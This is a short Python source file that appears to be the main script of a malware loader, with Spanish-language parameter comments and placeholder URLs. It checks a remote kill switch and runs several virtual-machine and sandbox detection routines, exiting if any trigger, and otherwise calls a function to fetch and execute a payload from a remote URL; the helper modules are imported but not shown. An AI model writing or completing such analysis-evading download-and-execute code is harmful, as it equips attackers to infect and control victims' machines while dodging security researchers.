import base64
import sys
import requests
import requests.exceptions
from killswitch import killswitch
from checkVM import checkVMserver, checkCPU, checkVMprocess
from executePayload import executePayload


# PARAMETROS
killswitch_URL = "REEMPLAZAR_KILL"
payload_URL = "REEMPLAZAR_PAYLOAD"



if killswitch(killswitch_URL) or checkCPU() or checkVMprocess() or checkVMserver():
    sys.exit(0)


executePayload(payload_URL)

